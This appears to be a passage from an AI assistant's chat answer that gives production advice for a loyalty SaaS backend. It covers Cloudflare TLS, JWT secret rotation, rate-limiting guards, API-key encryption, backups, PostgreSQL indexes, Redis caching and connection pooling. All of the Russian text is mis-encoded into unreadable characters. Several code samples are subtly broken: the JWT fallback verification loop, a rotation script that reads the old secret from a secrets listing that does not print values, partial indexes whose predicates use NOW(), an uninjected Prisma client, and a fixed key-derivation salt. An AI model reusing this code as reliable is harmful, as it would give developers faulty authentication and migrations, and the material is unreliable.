- โ Canary = ัะฝะธะถะฐะตั ัะธัะบ ะฟัะธ ะฑะพะปััะธั ะธะทะผะตะฝะตะฝะธัั

**fly.toml:**

```toml
[deploy]
  strategy = "rolling"
  wait_timeout = "5m"
  
  # Health checks ะฟะตัะตะด ะฟะตัะตะบะปััะตะฝะธะตะผ ััะฐัะธะบะฐ
  [deploy.health_checks]
    [deploy.health_checks.http]
      protocol = "http"
      port = 3000
      path = "/health/ready"
      interval = "10s"
      timeout = "2s"
      grace_period = "30s"
```


***

## ๐ **ะะะะ 4: SECURITY \& SECRETS (5 ะฒะพะฟัะพัะพะฒ)**

### **2๏ธโฃ1๏ธโฃ SSL/TLS certificates: ะะฐะบ ะฝะฐัััะพะธัั HTTPS?**

**ะะะะะะก:** Cloudflare ะธะปะธ Let's Encrypt?

**ะกะะะะะะะะ:**


| ะะฐัะธะฐะฝั | ะะปััั | ะะธะฝััั |
| :-- | :-- | :-- |
| **Fly.io Auto SSL** | ะะฒัะพะผะฐัะธัะตัะบะธะน Let's Encrypt | ะขะพะปัะบะพ ะดะปั `*.fly.dev` |
| **Cloudflare Proxy** โญ | CDN + DDoS protection + Free SSL | +5-10ms latency |
| **Let's Encrypt Manual** | ะะพะฝััะพะปั | ะัะถะฝะพ ะพะฑะฝะพะฒะปััั ะบะฐะถะดัะต 90 ะดะฝะตะน |


***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ: Cloudflare (Free plan)**

**ะะพัะตะผั:**

- โ Free SSL (auto-renew)
- โ CDN (ะบััะธััะตั static assets)
- โ DDoS protection
- โ Web Application Firewall (WAF)
- โ DNS management
- โ R2 Storage ัะถะต ะตััั (ะธะฝัะตะณัะฐัะธั)

**Setup:**

```bash
# 1. ะะตะณะธัััะธััะตะผ ะดะพะผะตะฝ ะฝะฐ Cloudflare
# max-loyalty.com โ Cloudflare DNS

# 2. ะะพะฑะฐะฒะปัะตะผ DNS records
api.max-loyalty.com โ CNAME โ max-loyalty-prod.fly.dev
app.max-loyalty.com โ CNAME โ max-loyalty-frontend.vercel.app

# 3. SSL Mode: Full (strict)
# Cloudflare โ[SSL]โ Fly.io โ[SSL]โ Backend

# 4. Page Rules (ะบััะธัะพะฒะฐะฝะธะต)
# api.max-loyalty.com/static/* โ Cache Everything, TTL 1 month
```

**Cloudflare settings:**

```
SSL/TLS: Full (strict)
Always Use HTTPS: On
Automatic HTTPS Rewrites: On
Minimum TLS Version: 1.2
TLS 1.3: On

Firewall Rules:
- Block requests from countries: None (ะดะปั ะะค ะบะปะธะตะฝัะพะฒ)
- Rate limiting: 100 req/min per IP ะดะปั /api/*
- Challenge on threat score > 50
```


***

### **2๏ธโฃ2๏ธโฃ Secrets rotation: ะะฐะบ ะพะฑะฝะพะฒะปััั JWT secrets ะฑะตะท downtime?**

**ะะะะะะก:** ะัะถะฝะพ ะพะฑะฝะพะฒะธัั JWT_SECRET. ะะฐะบ ะฝะต ัะฐะทะปะพะณะธะฝะธัั ะฒัะตั ะฟะพะปัะทะพะฒะฐัะตะปะตะน?

**ะะะ ะะะจะะะะ: Dual secrets period**

```typescript
// config/jwt.config.ts
export const jwtConfig = {
  // Primary secret (ะธัะฟะพะปัะทัะตะผ ะดะปั ะฟะพะดะฟะธัะธ ะฝะพะฒัั ัะพะบะตะฝะพะฒ)
  secret: process.env.JWT_SECRET,
  
  // Old secrets (ะฒะฐะปะธะดะธััะตะผ ัะพะบะตะฝั ะฟะพะดะฟะธัะฐะฝะฝัะต ััะฐััะผะธ)
  oldSecrets: [
    process.env.JWT_SECRET_OLD_1,
    process.env.JWT_SECRET_OLD_2,
  ].filter(Boolean),
  
  expiresIn: '15m',
};
```

```typescript
// auth/jwt.strategy.ts
import { Injectable } from '@nestjs/common';
import { PassportStrategy } from '@nestjs/passport';
import { ExtractJwt, Strategy } from 'passport-jwt';

@Injectable()
export class JwtStrategy extends PassportStrategy(Strategy) {
  constructor(private configService: ConfigService) {
    super({
      jwtFromRequest: ExtractJwt.fromAuthHeaderAsBearerToken(),
      secretOrKeyProvider: (request, rawJwtToken, done) => {
        // ะัะพะฑัะตะผ ะฒะฐะปะธะดะธัะพะฒะฐัั current secret
        const currentSecret = configService.get('JWT_SECRET');
        
        jwt.verify(rawJwtToken, currentSecret, (err) => {
          if (!err) {
            return done(null, currentSecret);
          }
          
          // ะัะพะฑัะตะผ old secrets
          const oldSecrets = configService.get('JWT_OLD_SECRETS') || [];
          for (const oldSecret of oldSecrets) {
            const verified = jwt.verify(rawJwtToken, oldSecret, (err) => !err);
            if (verified) {
              return done(null, oldSecret);
            }
          }
          
          // ะะต ะฟะพะดะพััะป ะฝะธ ะพะดะธะฝ
          done(new UnauthorizedException('Invalid token'));
        });
      },
    });
  }

  async validate(payload: JwtPayload) {
    return {
      userId: payload.sub,
      email: payload.email,
      tenantId: payload.tenantId,
    };
  }
}
```

**ะัะพัะตัั ัะพัะฐัะธะธ:**

```bash
# ะะตะฝั 1: ะะพะฑะฐะฒะปัะตะผ ะฝะพะฒัะน secret ะบะฐะบ primary
OLD_SECRET=$(fly secrets list | grep JWT_SECRET | awk '{print $2}')
NEW_SECRET=$(openssl rand -base64 32)

fly secrets set \
  JWT_SECRET="$NEW_SECRET" \
  JWT_SECRET_OLD_1="$OLD_SECRET"

# ะะตะฟะปะพะธะผ (ัะตะฟะตัั ะฝะพะฒัะต ัะพะบะตะฝั ะฟะพะดะฟะธััะฒะฐัััั NEW_SECRET, ััะฐััะต ะฒะฐะปะธะดะธัััััั)
fly deploy

# ะะตะฝั 30: ะฃะดะฐะปัะตะผ ััะฐััะน secret (ะฒัะต ัะพะบะตะฝั ั old secret ะธััะตะบะปะธ ัะตัะตะท 30 ะดะฝะตะน)
fly secrets unset JWT_SECRET_OLD_1
```


***

### **2๏ธโฃ3๏ธโฃ Rate limiting: ะะดะต ััะฐะฒะธัั - Cloudflare ะธะปะธ Backend?**

**ะะะะะะก:** Cloudflare WAF vs Backend rate limiting?

**ะะะ ะะะจะะะะ: ะะฑะฐ ัะปะพั**

**Layer 1: Cloudflare (network level)**

```
Rate Limiting Rules:
1. 100 requests/minute per IP ะดะปั /api/*
2. 10 requests/minute per IP ะดะปั /auth/login (ะฑััััะพัั)
3. 1000 requests/hour per IP ะดะปั ะฒัะตะณะพ ัะฐะนัะฐ
```

**Layer 2: Backend (application level)**

```typescript
// apps/backend/src/common/guards/rate-limit.guard.ts
import { Injectable, CanActivate, ExecutionContext, HttpException, HttpStatus } from '@nestjs/common';
import { Reflector } from '@nestjs/core';
import { RedisService } from '@/redis/redis.service';

interface RateLimitOptions {
  points: number;  // ะะพะปะธัะตััะฒะพ ะทะฐะฟัะพัะพะฒ
  duration: number;  // ะะฐ ะฟะตัะธะพะด (ัะตะบัะฝะดั)
  blockDuration?: number;  // ะะฐ ัะบะพะปัะบะพ ะฑะปะพะบะธัะพะฒะฐัั
}

@Injectable()
export class RateLimitGuard implements CanActivate {
  constructor(
    private reflector: Reflector,
    private redis: RedisService,
  ) {}

  async canActivate(context: ExecutionContext): Promise<boolean> {
    const options = this.reflector.get<RateLimitOptions>(
      'rateLimit',
      context.getHandler(),
    );

    if (!options) return true;

    const request = context.switchToHttp().getRequest();
    const key = this.getKey(request, options);

    const current = await this.redis.get(key);
    const count = current ? parseInt(current) : 0;

    if (count >= options.points) {
      throw new HttpException(
        {
          statusCode: HttpStatus.TOO_MANY_REQUESTS,
          message: 'Too many requests',
          retryAfter: options.duration,
        },
        HttpStatus.TOO_MANY_REQUESTS,
      );
    }

    // Increment counter
    if (count === 0) {
      await this.redis.set(key, '1', options.duration);
    } else {
      await this.redis.incr(key);
    }

    return true;
  }

  private getKey(request: any, options: RateLimitOptions): string {
    const ip = request.ip;
    const userId = request.user?.id || 'anonymous';
    const endpoint = request.route.path;
    
    return `ratelimit:${endpoint}:${userId}:${ip}`;
  }
}

// Decorator
export const RateLimit = (options: RateLimitOptions) => 
  SetMetadata('rateLimit', options);
```

**ะัะฟะพะปัะทะพะฒะฐะฝะธะต:**

```typescript
@Post('login')
@RateLimit({ points: 5, duration: 900 })  // 5 ะฟะพะฟััะพะบ ะทะฐ 15 ะผะธะฝัั
async login(@Body() dto: LoginDto) {
  // ...
}

@Post('loyalty/transactions')
@RateLimit({ points: 100, duration: 60 })  // 100 ััะฐะฝะทะฐะบัะธะน ะฒ ะผะธะฝััั
async createTransaction(@Body() dto: CreateTransactionDto) {
  // ...
}
```


***

### **2๏ธโฃ4๏ธโฃ API Keys ะดะปั ะฒะฝะตัะฝะธั ะธะฝัะตะณัะฐัะธะน: ะะฐะบ ััะฐะฝะธัั?**

**ะะะะะะก:** POS ัะธััะตะผั ะธ ะฟะปะฐััะถะฝัะต ะฟัะพะฒะฐะนะดะตัั ะดะฐัั API keys. ะะฐะบ ะฑะตะทะพะฟะฐัะฝะพ ััะฐะฝะธัั?

**ะะะ ะะะจะะะะ:**

**ะงัะฒััะฒะธัะตะปัะฝะพััั ะดะฐะฝะฝัั:**


| ะขะธะฟ | ะฅัะฐะฝะตะฝะธะต | ะัะธะผะตั |
| :-- | :-- | :-- |
| **Platform secrets** | Fly.io secrets | JWT_SECRET, DATABASE_URL |
| **Tenant-specific** | Database encrypted | POS API key tenant'ะฐ |
| **Public keys** | Config/ENV | Telegram Bot Token (public) |

**Encryption ะฒ ะะ:**

```typescript
// apps/backend/src/common/encryption/encryption.service.ts
import { Injectable } from '@nestjs/common';
import * as crypto from 'crypto';

@Injectable()
export class EncryptionService {
  private readonly algorithm = 'aes-256-gcm';
  private readonly key: Buffer;

  constructor() {
    // ะะตะฝะตัะธััะตะผ ะบะปัั ะธะท ENCRYPTION_KEY (32 bytes)
    this.key = crypto.scryptSync(
      process.env.ENCRYPTION_KEY,
      'salt',
      32,
    );
  }

  encrypt(text: string): string {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(this.algorithm, this.key, iv);
    
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    // iv:authTag:encrypted
    return `${iv.toString('hex')}:${authTag.toString('hex')}:${encrypted}`;
  }

  decrypt(encryptedText: string): string {
    const [ivHex, authTagHex, encrypted] = encryptedText.split(':');
    
    const iv = Buffer.from(ivHex, 'hex');
    const authTag = Buffer.from(authTagHex, 'hex');
    const decipher = crypto.createDecipheriv(this.algorithm, this.key, iv);
    
    decipher.setAuthTag(authTag);
    
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
  }
}
```

**ะัะฟะพะปัะทะพะฒะฐะฝะธะต ะฒ Entity:**

```typescript
// POS Integration entity
{
  id: 'uuid',
  tenantId: 'tenant-123',
  provider: 'iiko',
  apiKey: 'encrypted:iv:authTag:data',  // ะะฐัะธััะพะฒะฐะฝะพ
  webhookSecret: 'encrypted:...',
}

// ะัะธ ัะพััะฐะฝะตะฝะธะธ
const encrypted = encryptionService.encrypt(apiKey);
await prisma.posIntegration.create({
  data: {
    apiKey: encrypted,
    // ...
  },
});

// ะัะธ ััะตะฝะธะธ
const integration = await prisma.posIntegration.findUnique({ ... });
const decrypted = encryptionService.decrypt(integration.apiKey);
```


***

### **2๏ธโฃ5๏ธโฃ Backup strategy: ะะฐะบ ะฝะต ะฟะพัะตัััั ะดะฐะฝะฝัะต?**

**ะะะะะะก:** ะะฒัะพะฑัะบะฐะฟั ะะ ะธ ะบะฐะบ ะฒะพัััะฐะฝะฐะฒะปะธะฒะฐัั?

**ะะะ ะะะจะะะะ (Neon.tech + manual S3):**

**Layer 1: Neon.tech automatic backups**

- โ Point-in-time recovery (ะฟะพัะปะตะดะฝะธะต 7 ะดะฝะตะน ะฝะฐ free tier)
- โ ะะฒัะพะผะฐัะธัะตัะบะธะต snapshots
- โ ะะพัััะฐะฝะพะฒะปะตะฝะธะต ัะตัะตะท UI

```bash
# ะะพัััะฐะฝะพะฒะปะตะฝะธะต ะฝะฐ ะพะฟัะตะดะตะปัะฝะฝะพะต ะฒัะตะผั
neon branches create --from main --timestamp "2026-02-12T10:00:00Z"
```

**Layer 2: Manual SQL dumps ะฒ S3 (ะตะถะตะดะฝะตะฒะฝะพ)**

```typescript
// apps/backend/src/cron/backup.job.ts
import { Injectable } from '@nestjs/common';
import { Cron, CronExpression } from '@nestjs/schedule';
import { exec } from 'child_process';
import { promisify } from 'util';
import { S3Service } from '@/storage/s3.service';

const execAsync = promisify(exec);

@Injectable()
export class BackupJob {
  constructor(private s3: S3Service) {}

  @Cron(CronExpression.EVERY_DAY_AT_3AM)
  async backupDatabase() {
    const timestamp = new Date().toISOString();
    const filename = `backup-${timestamp}.sql.gz`;

    try {
      // pg_dump โ gzip
      await execAsync(
        `pg_dump $DATABASE_URL | gzip > /tmp/${filename}`,
      );

      // Upload to S3
      await this.s3.uploadFile(
        `/tmp/${filename}`,
        `backups/${filename}`,
      );

      // Cleanup local file
      await execAsync(`rm /tmp/${filename}`);

      console.log(`โ Backup created: ${filename}`);
    } catch (error) {
      console.error('โ Backup failed:', error);
      // Alert ัะตัะตะท Better Stack
    }
  }

  // ะฃะดะฐะปะตะฝะธะต ััะฐััั ะฑัะบะฐะฟะพะฒ (> 30 ะดะฝะตะน)
  @Cron(CronExpression.EVERY_WEEK)
  async cleanupOldBackups() {
    const thirtyDaysAgo = new Date();
    thirtyDaysAgo.setDate(thirtyDaysAgo.getDate() - 30);

    const objects = await this.s3.listObjects('backups/');
    
    for (const obj of objects) {
      if (obj.LastModified < thirtyDaysAgo) {
        await this.s3.deleteObject(obj.Key);
        console.log(`๐๏ธ Deleted old backup: ${obj.Key}`);
      }
    }
  }
}
```

**ะะพัััะฐะฝะพะฒะปะตะฝะธะต:**

```bash
# 1. ะกะบะฐัะธะฒะฐะตะผ backup ะธะท S3
aws s3 cp s3://max-loyalty/backups/backup-2026-02-12.sql.gz .

# 2. ะะฐัะฟะฐะบะพะฒัะฒะฐะตะผ
gunzip backup-2026-02-12.sql.gz

# 3. ะะพัััะฐะฝะฐะฒะปะธะฒะฐะตะผ
psql $DATABASE_URL < backup-2026-02-12.sql
```


***

ะัะพะดะพะปะถะธัั ั ะฟะพัะปะตะดะฝะธะผะธ 10 ะฒะพะฟัะพัะฐะผะธ (ะผะพะฝะธัะพัะธะฝะณ ะดะตัะฐะปัะฝะพ, production checklist)? ๐ฏ

---

# ะัะพะดะพะปะถะฐะน

ะัะพะดะพะปะถะฐั! ๐

***

## ๐ **ะะะะ 5: PERFORMANCE \& OPTIMIZATION (5 ะฒะพะฟัะพัะพะฒ)**

### **2๏ธโฃ6๏ธโฃ Database indexes: ะะฐะบะธะต ะธะฝะดะตะบัั ัะพะทะดะฐัั ะดะปั production?**

**ะะะะะะก:** ะะฐะบะธะต ะธะฝะดะตะบัั ะบัะธัะธัะฝั ะดะปั ะฟัะพะธะทะฒะพะดะธัะตะปัะฝะพััะธ?

**ะะะ ะะะจะะะะ (ะะฝะฐะปะธะท ะทะฐะฟัะพัะพะฒ ะธะท Backend API):**

```sql
-- prisma/migrations/YYYYMMDD_performance_indexes/migration.sql

-- ============================================
-- GUESTS & CARDS
-- ============================================

-- ะะพะธัะบ ะณะพััั ะฟะพ ัะตะปะตัะพะฝั (ะฐะฒัะพัะธะทะฐัะธั, ัะพะทะดะฐะฝะธะต)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "Guest_phone_idx" 
  ON "Guest"("phone") WHERE "status" != 'DELETED';

-- ะะพะธัะบ ะณะพััั ะฟะพ email
CREATE INDEX CONCURRENTLY IF NOT EXISTS "Guest_email_idx" 
  ON "Guest"("email") WHERE "email" IS NOT NULL;

-- ะะพะธัะบ ะณะพััั ะฟะพ telegram_id
CREATE INDEX CONCURRENTLY IF NOT EXISTS "Guest_telegram_id_idx" 
  ON "Guest"("telegram_id") WHERE "telegram_id" IS NOT NULL;

-- ะะพะธัะบ ะบะฐัั ะฟะพ tenant (ัะฟะธัะพะบ ะณะพััะตะน ะฒ ะฐะดะผะธะฝะบะต)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "GuestCard_tenant_status_idx" 
  ON "GuestCard"("tenant_id", "status") 
  INCLUDE ("total_balance", "level_id", "created_at");

-- ะะพะธัะบ ะบะฐััั ะฟะพ QR ะบะพะดั (ัะบะฐะฝะธัะพะฒะฐะฝะธะต ะฝะฐ ะบะฐััะต)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "GuestCard_qr_code_idx" 
  ON "GuestCard"("qr_code") WHERE "status" = 'ACTIVE';

-- ะะพะธัะบ ะบะฐััั ะฟะพ 6-digit ะบะพะดั
CREATE INDEX CONCURRENTLY IF NOT EXISTS "GuestCard_display_code_idx" 
  ON "GuestCard"("display_code") WHERE "status" = 'ACTIVE';

-- ============================================
-- TRANSACTIONS
-- ============================================

-- ะััะพัะธั ััะฐะฝะทะฐะบัะธะน ะณะพััั (ะฟัะพัะธะปั ะฒ Telegram)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "BallTransaction_card_created_idx" 
  ON "BallTransaction"("guest_card_id", "created_at" DESC) 
  INCLUDE ("type", "amount", "description");

-- ะขัะฐะฝะทะฐะบัะธะธ ะฟะพ tenant (ะฐะฝะฐะปะธัะธะบะฐ)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "BallTransaction_tenant_created_idx" 
  ON "BallTransaction"("tenant_id", "created_at" DESC) 
  WHERE "type" IN ('EARN', 'REDEEM');

-- ะะพะธัะบ ะฟะพ POS check ID (reconciliation)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "BallTransaction_pos_check_idx" 
  ON "BallTransaction"("pos_transaction_id") 
  WHERE "pos_transaction_id" IS NOT NULL;

-- ============================================
-- LOYALTY RULES
-- ============================================

-- ะะบัะธะฒะฝัะต ะฟัะฐะฒะธะปะฐ ะดะปั tenant (ัะฐัััั ะฑะฐะปะปะพะฒ)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "LoyaltyRule_tenant_active_idx" 
  ON "LoyaltyRule"("tenant_id", "is_active", "priority" DESC) 
  WHERE "is_active" = true;

-- ============================================
-- PROMO
-- ============================================

-- ะะบัะธะฒะฝัะต ะฟัะพะผะพ ะดะปั tenant
CREATE INDEX CONCURRENTLY IF NOT EXISTS "Promo_tenant_active_dates_idx" 
  ON "Promo"("tenant_id", "is_active", "start_date", "end_date") 
  WHERE "is_active" = true;

-- ะัะพะฒะตัะบะฐ ะธัะฟะพะปัะทะพะฒะฐะฝะธั ะฟัะพะผะพ ะณะพััะตะผ
CREATE INDEX CONCURRENTLY IF NOT EXISTS "PromoBallGranted_guest_promo_idx" 
  ON "PromoBallGranted"("guest_card_id", "promo_id", "created_at" DESC);

-- ============================================
-- USERS & AUTH
-- ============================================

-- ะะพะธัะบ ะฟะพะปัะทะพะฒะฐัะตะปั ะฟะพ email/phone (ะปะพะณะธะฝ)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "User_email_idx" 
  ON "User"("email") WHERE "email" IS NOT NULL;

CREATE INDEX CONCURRENTLY IF NOT EXISTS "User_phone_idx" 
  ON "User"("phone") WHERE "phone" IS NOT NULL;

-- ะกะตััะธะธ ะฟะพะปัะทะพะฒะฐัะตะปั (ะฟัะพะฒะตัะบะฐ refresh token)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "UserSession_user_token_idx" 
  ON "UserSession"("user_id", "refresh_token") 
  WHERE "expires_at" > NOW();

-- ============================================
-- TENANTS & SUBSCRIPTIONS
-- ============================================

-- ะะบัะธะฒะฝัะต ะฟะพะดะฟะธัะบะธ (ะฟัะพะฒะตัะบะฐ ะปะธะผะธัะพะฒ)
CREATE INDEX CONCURRENTLY IF NOT EXISTS "Subscription_tenant_status_idx" 
  ON "Subscription"("tenant_id", "status") 
  WHERE "status" IN ('ACTIVE', 'PAST_DUE');

-- ============================================
-- ANALYTICS (ะฟัะตะดัะฐััะธัะฐะฝะฝัะต ัะฐะฑะปะธัั)
-- ============================================

-- ะะฝะตะฒะฝะฐั ะฐะฝะฐะปะธัะธะบะฐ ะฟะพ tenant
CREATE INDEX CONCURRENTLY IF NOT EXISTS "AnalyticsDailySnapshot_tenant_date_idx" 
  ON "AnalyticsDailySnapshot"("tenant_id", "date" DESC);

-- ============================================
-- PARTIAL INDEXES (ัะบะพะฝะพะผะธะผ ะผะตััะพ)
-- ============================================

-- ะขะพะปัะบะพ ะฐะบัะธะฒะฝัะต ะบะฐััั
CREATE INDEX CONCURRENTLY IF NOT EXISTS "GuestCard_active_idx" 
  ON "GuestCard"("tenant_id", "guest_id") 
  WHERE "status" = 'ACTIVE';

-- ะขะพะปัะบะพ ะฝะตะธัะฟะพะปัะทะพะฒะฐะฝะฝัะต ะฟัะพะผะพ
CREATE INDEX CONCURRENTLY IF NOT EXISTS "Promo_unused_idx" 
  ON "Promo"("tenant_id", "promo_type") 
  WHERE "is_active" = true AND "end_date" > NOW();
```

**ะัะพะฒะตัะบะฐ ัััะตะบัะธะฒะฝะพััะธ:**

```typescript
// scripts/analyze-queries.ts
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();

async function analyzeSlowQueries() {
  // ะะบะปััะฐะตะผ ะปะพะณะธัะพะฒะฐะฝะธะต ะผะตะดะปะตะฝะฝัั ะทะฐะฟัะพัะพะฒ
  await prisma.$executeRaw`
    ALTER DATABASE max_loyalty_prod SET log_min_duration_statement = 1000;
  `;

  // ะกะผะพััะธะผ ััะฐัะธััะธะบั ะธัะฟะพะปัะทะพะฒะฐะฝะธั ะธะฝะดะตะบัะพะฒ
  const indexStats = await prisma.$queryRaw`
    SELECT
      schemaname,
      tablename,
      indexname,
      idx_scan as index_scans,
      idx_tup_read as tuples_read,
      idx_tup_fetch as tuples_fetched
    FROM pg_stat_user_indexes
    WHERE idx_scan = 0  -- ะะตะธัะฟะพะปัะทัะตะผัะต ะธะฝะดะตะบัั
    ORDER BY tablename;
  `;

  console.log('Unused indexes:', indexStats);

  // ะัะพะฒะตััะตะผ ัะฐะผัะต ะผะตะดะปะตะฝะฝัะต ะทะฐะฟัะพัั
  const slowQueries = await prisma.$queryRaw`
    SELECT
      query,
      calls,
      total_exec_time,
      mean_exec_time,
      max_exec_time
    FROM pg_stat_statements
    WHERE mean_exec_time > 100  -- > 100ms
    ORDER BY mean_exec_time DESC
    LIMIT 20;
  `;

  console.log('Slow queries:', slowQueries);
}
```


***

### **2๏ธโฃ7๏ธโฃ Caching strategy: ะงัะพ ะบััะธัะพะฒะฐัั ะธ ะฝะฐ ัะบะพะปัะบะพ?**

**ะะะะะะก:** ะะฐะบะธะต ะดะฐะฝะฝัะต ะบััะธัะพะฒะฐัั ะฒ Redis ะดะปั ัะฝะธะถะตะฝะธั ะฝะฐะณััะทะบะธ ะฝะฐ ะะ?

**ะะะ ะะะจะะะะ (Layered caching):**

```typescript
// apps/backend/src/cache/cache.service.ts
import { Injectable } from '@nestjs/common';
import { RedisService } from '@/redis/redis.service';

@Injectable()
export class CacheService {
  constructor(private redis: RedisService) {}

  // ============================================
  // LAYER 1: SHORT-TERM CACHE (1-5 ะผะธะฝัั)
  // ะงะฐััะพ ัะธัะฐะตะผัะต ะดะฐะฝะฝัะต, ะบะพัะพััะต ะผะพะณัั ัััะฐัะตัั
  // ============================================

  // ะะบัะธะฒะฝัะต ะฟัะฐะฒะธะปะฐ ะปะพัะปัะฝะพััะธ tenant'ะฐ
  async getLoyaltyRules(tenantId: string) {
    const key = `loyalty:rules:${tenantId}`;
    const cached = await this.redis.get(key);
    
    if (cached) {
      return JSON.parse(cached);
    }

    const rules = await this.prisma.loyaltyRule.findMany({
      where: { tenantId, isActive: true },
      orderBy: { priority: 'desc' },
    });

    await this.redis.set(key, JSON.stringify(rules), 300); // 5 ะผะธะฝัั
    return rules;
  }

  // ะฃัะพะฒะฝะธ ะปะพัะปัะฝะพััะธ
  async getLoyaltyLevels(tenantId: string) {
    const key = `loyalty:levels:${tenantId}`;
    const cached = await this.redis.get(key);
    
    if (cached) return JSON.parse(cached);

    const levels = await this.prisma.loyaltyLevel.findMany({
      where: { tenantId },
      orderBy: { thresholdAmount: 'asc' },
    });

    await this.redis.set(key, JSON.stringify(levels), 300);
    return levels;
  }

  // ============================================
  // LAYER 2: MEDIUM-TERM CACHE (1 ัะฐั)
  // ะะตะดะบะพ ะผะตะฝัััะธะตัั ะดะฐะฝะฝัะต
  // ============================================

  // ะะพะฝัะธะณััะฐัะธั tenant'ะฐ
  async getTenantConfig(tenantId: string) {
    const key = `tenant:config:${tenantId}`;
    const cached = await this.redis.get(key);
    
    if (cached) return JSON.parse(cached);

    const config = await this.prisma.tenant.findUnique({
      where: { id: tenantId },
      include: { subscription: true },
    });

    await this.redis.set(key, JSON.stringify(config), 3600); // 1 ัะฐั
    return config;
  }

  // ============================================
  // LAYER 3: LONG-TERM CACHE (24 ัะฐัะฐ)
  // ะกัะฐัะธัะตัะบะธะต ะดะฐะฝะฝัะต
  // ============================================

  // ะกะฟะธัะพะบ ัะฐัะธัะพะฒ
  async getSubscriptionPlans() {
    const key = 'plans:all';
    const cached = await this.redis.get(key);
    
    if (cached) return JSON.parse(cached);

    const plans = await this.prisma.subscriptionPlan.findMany();

    await this.redis.set(key, JSON.stringify(plans), 86400); // 24 ัะฐัะฐ
    return plans;
  }

  // ============================================
  // LAYER 4: SESSION CACHE (JWT payload)
  // ะะพ ะธััะตัะตะฝะธั ัะพะบะตะฝะฐ
  // ============================================

  async cacheUserSession(userId: string, payload: any, ttl: number) {
    const key = `session:${userId}`;
    await this.redis.set(key, JSON.stringify(payload), ttl);
  }

  async getUserSession(userId: string) {
    const key = `session:${userId}`;
    const cached = await this.redis.get(key);
    return cached ? JSON.parse(cached) : null;
  }

  // ============================================
  // INVALIDATION HELPERS
  // ============================================

  async invalidateLoyaltyCache(tenantId: string) {
    await this.redis.del(`loyalty:rules:${tenantId}`);
    await this.redis.del(`loyalty:levels:${tenantId}`);
  }

  async invalidateTenantCache(tenantId: string) {
    // Invalidate all tenant-related caches
    const pattern = `*:${tenantId}`;
    const keys = await this.redis.keys(pattern);
    if (keys.length > 0) {
      await Promise.all(keys.map(key => this.redis.del(key)));
    }
  }
}
```

**Cache-aside pattern ะฒ ัะตัะฒะธัะฐั:**

```typescript
// loyalty/loyalty-rules.service.ts
@Injectable()
export class LoyaltyRulesService {
  constructor(
    private cache: CacheService,
    private prisma: PrismaService,
  ) {}

  async getActiveRules(tenantId: string) {
    // 1. Try cache
    return this.cache.getLoyaltyRules(tenantId);
  }

  async updateRule(id: string, data: UpdateRuleDto) {
    // 1. Update DB
    const rule = await this.prisma.loyaltyRule.update({
      where: { id },
      data,
    });

    // 2. Invalidate cache
    await this.cache.invalidateLoyaltyCache(rule.tenantId);

    return rule;
  }
}
```

**Cache warming (preloading):**

```typescript
// cron/cache-warming.job.ts
@Injectable()
export class CacheWarmingJob {
  constructor(private cache: CacheService) {}

  // ะัะพะณัะตะฒะฐะตะผ ะบัั ะดะปั ะฐะบัะธะฒะฝัั tenant'ะพะฒ ะบะฐะถะดัะต 10 ะผะธะฝัั
  @Cron('*/10 * * * *')
  async warmCache() {
    const activeTenants = await this.prisma.tenant.findMany({
      where: {
        subscription: {
          status: 'ACTIVE',
        },
      },
      take: 100, // Top 100 ะฐะบัะธะฒะฝัั
    });

    for (const tenant of activeTenants) {
      // Prewarm frequently accessed data
      await this.cache.getLoyaltyRules(tenant.id);
      await this.cache.getLoyaltyLevels(tenant.id);
    }

    console.log(`โ Cache warmed for ${activeTenants.length} tenants`);
  }
}
```


***

### **2๏ธโฃ8๏ธโฃ Database connection pooling: ะกะบะพะปัะบะพ ัะพะตะดะธะฝะตะฝะธะน ะฝัะถะฝะพ?**

**ะะะะะะก:** ะะฐะบ ะฝะฐัััะพะธัั connection pool ะดะปั 256 MB RAM ะฝะฐ Fly.io?

**ะะะ ะะะจะะะะ:**

**ะะฐัััั:**

```
256 MB RAM per VM
- 50 MB Node.js runtime
- 50 MB application code
- 100 MB ะดะปั ะทะฐะฟัะพัะพะฒ
= ~56 MB ะดะปั DB connections

ะะดะฝะพ PostgreSQL ัะพะตะดะธะฝะตะฝะธะต โ 2-3 MB RAM
56 MB / 3 MB = ~18 connections max

ะะตะทะพะฟะฐัะฝะพะต ะทะฝะฐัะตะฝะธะต: 10 connections per VM
```

**Prisma config:**

```typescript
// apps/backend/src/database/prisma.service.ts
import { Injectable, OnModuleInit, OnModuleDestroy } from '@nestjs/common';
import { PrismaClient } from '@prisma/client';

@Injectable()
export class PrismaService extends PrismaClient implements OnModuleInit, OnModuleDestroy {
  constructor() {
    super({
      datasources: {
        db: {
          url: process.env.DATABASE_URL,
        },
      },
      log: process.env.NODE_ENV === 'development' 
        ? ['query', 'error', 'warn'] 
        : ['error'],
      
      // Connection pool settings
      // https://www.prisma.io/docs/concepts/components/prisma-client/connection-pool
    });
  }

  async onModuleInit() {
    // ะฃััะฐะฝะฐะฒะปะธะฒะฐะตะผ connection pool limits ัะตัะตะท DATABASE_URL
    // postgresql://user:pass@host:5432/db?connection_limit=10&pool_timeout=20

    await this.$connect();
    console.log('โ Prisma connected to database');
  }

  async onModuleDestroy() {
    await this.$disconnect();
  }
}
```

**DATABASE_URL ั ะฟะฐัะฐะผะตััะฐะผะธ:**

```bash
# Fly.io secrets
fly secrets set DATABASE_URL="postgresql://user:pass@neon.tech:5432/max_loyalty_prod?connection_limit=10&pool_timeout=20&connect_timeout=10"

# ะะฐัะฐะผะตััั:
# connection_limit=10   - ะะฐะบัะธะผัะผ 10 ัะพะตะดะธะฝะตะฝะธะน ะพั ััะพะณะพ ะธะฝััะฐะฝัะฐ
